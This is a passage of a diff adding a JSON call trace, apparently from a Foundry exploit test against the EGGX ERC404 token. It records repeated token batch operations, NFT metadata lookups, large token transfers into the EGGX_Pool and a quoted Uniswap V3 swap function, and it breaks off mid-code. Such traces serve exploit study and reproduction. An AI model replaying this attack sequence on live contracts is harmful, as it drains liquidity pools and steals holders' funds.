+        "args": "[30281 [3.028e4], 30217 [3.021e4], 30245 [3.024e4], 30192 [3.019e4], 30027 [3.002e4], 30181 [3.018e4]]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "622",
+        "args": "30281 [3.028e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30217 [3.021e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30245 [3.024e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30192 [3.019e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30027 [3.002e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30181 [3.018e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "14017",
+        "args": "30281 [3.028e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30281\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-mountainblackwinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"black\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"mountain\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "13927",
+        "args": "30217 [3.021e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30217\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-mountainbluewinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"blue\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"mountain\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "14282",
+        "args": "30245 [3.024e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30245\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-mountaincamouflagewinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"camouflage\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"mountain\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "13959",
+        "args": "30192 [3.019e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30192\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-mountaingreenwinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"green\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"mountain\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "13898",
+        "args": "30027 [3.002e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30027\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-mountainredwinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"red\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"mountain\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "14122",
+        "args": "30181 [3.018e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30181\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-mountainyellowwinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"yellow\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"mountain\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "352110",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 48000000000000000000000 [4.8e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "10093953",
+        "args": "[30368 [3.036e4], 30488 [3.048e4], 30259 [3.025e4], 30284 [3.028e4], 30084 [3.008e4], 30395 [3.039e4]]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "622",
+        "args": "30368 [3.036e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30488 [3.048e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30259 [3.025e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30284 [3.028e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30084 [3.008e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30395 [3.039e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "14017",
+        "args": "30368 [3.036e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30368\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-mountainblackwinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"black\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"mountain\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "13927",
+        "args": "30488 [3.048e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30488\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-mountainbluewinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"blue\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"mountain\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "14282",
+        "args": "30259 [3.025e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30259\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-mountaincamouflagewinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"camouflage\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"mountain\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "13959",
+        "args": "30284 [3.028e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30284\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-mountaingreenwinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"green\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"mountain\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "13898",
+        "args": "30084 [3.008e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30084\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-mountainredwinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"red\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"mountain\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "14122",
+        "args": "30395 [3.039e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30395\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-mountainyellowwinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"yellow\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"mountain\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "352110",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 48000000000000000000000 [4.8e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "11216890",
+        "args": "[30408 [3.04e4], 30111 [3.011e4], 30365 [3.036e4], 30144 [3.014e4], 30176 [3.017e4], 30054 [3.005e4]]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "622",
+        "args": "30408 [3.04e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30111 [3.011e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30365 [3.036e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30144 [3.014e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30176 [3.017e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30054 [3.005e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "14039",
+        "args": "30408 [3.04e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30408\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-riverblackwinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"black\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"river\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "13952",
+        "args": "30111 [3.011e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30111\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-riverbluewinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"blue\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"river\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "14174",
+        "args": "30365 [3.036e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30365\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-rivercamouflagewinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"camouflage\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"river\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "13981",
+        "args": "30144 [3.014e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30144\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-rivergreenwinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"green\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"river\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "13920",
+        "args": "30176 [3.017e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30176\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-riverredwinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"red\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"river\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "14014",
+        "args": "30054 [3.005e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30054\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-riveryellowwinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"yellow\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"river\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "352110",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 48000000000000000000000 [4.8e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "7504618",
+        "args": "[30039 [3.003e4], 30045 [3.004e4], 30030 [3.003e4], 30070 [3.007e4], 30055 [3.005e4], 30213 [3.021e4]]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "622",
+        "args": "30039 [3.003e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30045 [3.004e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30030 [3.003e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30070 [3.007e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30055 [3.005e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "622",
+        "args": "30213 [3.021e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]"
+    },
+    {
+        "id": "13952",
+        "args": "30039 [3.003e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30039\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-starblackwinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"black\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"star\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "13862",
+        "args": "30045 [3.004e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30045\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-starbluewinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"blue\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"star\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "14083",
+        "args": "30030 [3.003e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30030\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-starcamouflagewinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"camouflage\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"star\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "13894",
+        "args": "30070 [3.007e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30070\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-stargreenwinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"green\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"star\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "13833",
+        "args": "30055 [3.005e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30055\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-starredwinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"red\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"star\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "13923",
+        "args": "30213 [3.021e4]",
+        "original_code": null,
+        "description": null,
+        "return_value": "\"data:application/json;utf8,{\\\"name\\\": \\\"EGGX #30213\\\",\\\"description\\\":\\\"A collection of 10,000 EGGX NFTs enabled by an adjustedversion of ERC404, an experimental token standardenabling persistent liquidity and semi-fungibility forEthereum NFTs.\\\",\\\"external_url\\\":\\\"https://eggs.build\\\",\\\"image\\\":\\\"https://token.eggx.app/egg-staryellowwinged.jpg\\\",\\\"attributes\\\":[{\\\"trait_type\\\":\\\"Color\\\",\\\"value\\\":\\\"yellow\\\"},{\\\"trait_type\\\":\\\"Pattern\\\",\\\"value\\\":\\\"star\\\"},{\\\"trait_type\\\":\\\"Wings\\\",\\\"value\\\":\\\"winged\\\"}]}\""
+    },
+    {
+        "id": "352110",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 48000000000000000000000 [4.8e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "565",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "12380425480766027049373298 [1.238e25]"
+    },
+    {
+        "id": "7121258",
+        "args": "EGGX_Pool: [0x26beBB6995a4736F088D129E82620eBA899B944F], 12128702757208325130521418 [1.212e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "534",
+        "args": "EGGX_Pool: [0x26beBB6995a4736F088D129E82620eBA899B944F]",
+        "original_code": null,
+        "description": null,
+        "return_value": "94558499930692410326 [9.455e19]"
+    },
+    {
+        "id": "565",
+        "args": "EGGX_Pool: [0x26beBB6995a4736F088D129E82620eBA899B944F]",
+        "original_code": null,
+        "description": null,
+        "return_value": "12128702757208325130521418 [1.212e25]"
+    },
+    {
+        "id": "565",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "251722723557701918851880 [2.517e23]"
+    },
+    {
+        "id": "209978",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], false, 251722723557701918851880 [2.517e23], 1461446703485210103287273052203988822378723970341 [1.461e48], 0x61",
+        "original_code": "    function swap(\n        address recipient,\n        bool zeroForOne,\n        int256 amountSpecified,\n        uint160 sqrtPriceLimitX96,\n        bytes calldata data\n    ) external override noDelegateCall returns (int256 amount0, int256 amount1) {\n        require(amountSpecified != 0, 'AS');\n\n        Slot0 memory slot0Start = slot0;\n\n        require(slot0Start.unlocked, 'LOK');\n        require(\n            zeroForOne\n                ? sqrtPriceLimitX96 < slot0Start.sqrtPriceX96 && sqrtPriceLimitX96 > TickMath.MIN_SQRT_RATIO\n                : sqrtPriceLimitX96 > slot0Start.sqrtPriceX96 && sqrtPriceLimitX96 < TickMath.MAX_SQRT_RATIO,\n            'SPL'\n        );\n\n        slot0.unlocked = false;\n\n        SwapCache memory cache =\n            SwapCache({\n                liquidityStart: liquidity,\n                blockTimestamp: _blockTimestamp(),\n                feeProtocol: zeroForOne ? (slot0Start.feeProtocol % 16) : (slot0Start.feeProtocol >> 4),\n                secondsPerLiquidityCumulativeX128: 0,\n                tickCumulative: 0,\n                computedLatestObservation: false\n            });\n\n        bool exactInput = amountSpecified > 0;\n\n        SwapState memory state =\n            SwapState({\n                amountSpecifiedRemaining: amountSpecified,\n                amountCalculated: 0,\n                sqrtPriceX96: slot0Start.sqrtPriceX96,\n                tick: slot0Start.tick,\n                feeGrowthGlobalX128: zeroForOne ? feeGrowthGlobal0X128 : feeGrowthGlobal1X128,\n                protocolFee: 0,\n                liquidity: cache.liquidityStart\n            });\n\n        // continue swapping as long as we haven't used the entire input/output and haven't reached the price limit\n        while (state.amountSpecifiedRemaining != 0 && state.sqrtPriceX96 != sqrtPriceLimitX96) {\n            StepComputations memory step;\n\n            step.sqrtPriceStartX96 = state.sqrtPriceX96;\n\n            (step.tickNext, step.initialized) = tickBitmap.nextInitializedTickWithinOneWord(\n                state.tick,\n                tickSpacing,\n                zeroForOne\n            );\n\n            // ensure that we do not overshoot the min/max tick, as the tick bitmap is not aware of these bounds\n            if (step.tickNext < TickMath.MIN_TICK) {\n                step.tickNext = TickMath.MIN_TICK;\n            } else if (step.tickNext > TickMath.MAX_TICK) {\n                step.tickNext = TickMath.MAX_TICK;\n            }\n\n            // get the price for the next tick\n            step.sqrtPriceNextX96 = TickMath.getSqrtRatioAtTick(step.tickNext);\n\n            // compute values to swap to the target tick, price limit, or point where input/output amount is exhausted\n            (state.sqrtPriceX96, step.amountIn, step.amountOut, step.feeAmount) = SwapMath.computeSwapStep(\n                state.sqrtPriceX96,\n                (zeroForOne ? step.sqrtPriceNextX96 < sqrtPriceLimitX96 : step.sqrtPriceNextX96 > sqrtPriceLimitX96)\n                    ? sqrtPriceLimitX96\n                    : step.sqrtPriceNextX96,\n                state.liquidity,\n                